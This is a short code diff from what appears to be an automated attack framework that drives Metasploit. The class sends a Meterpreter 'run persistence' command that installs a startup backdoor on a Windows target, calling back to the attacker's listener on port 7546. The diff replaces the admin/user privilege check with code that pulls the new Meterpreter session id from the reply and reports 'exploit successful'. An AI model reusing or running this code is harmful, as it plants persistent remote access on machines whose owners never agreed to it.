@@ -37,16 +37,15 @@ class Control(object):
         # deliver persistance payload
         cmd = "run persistence -A -L c:\\\\ -X 30 -p 7546 -r "
         cmd += config.MSF_LHOST
-        print(cmd)
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True, wait=10)
-        print(msf_reply)
-        if 'AUTHORITY' in msf_reply:
-            target.access = 'admin'
-        else:
-            target.access = 'user'
         # background session
         config.MSFCONSOLE.background_session(target_name)
-
+        # handle result
+        for line in msf_reply.splitlines():
+            if 'Meterpreter session' in line:
+                words = line.split()
+                target.session_id = words[3]
+                print("[*] exploit successful, new session id:", words[3])
 
 
 #
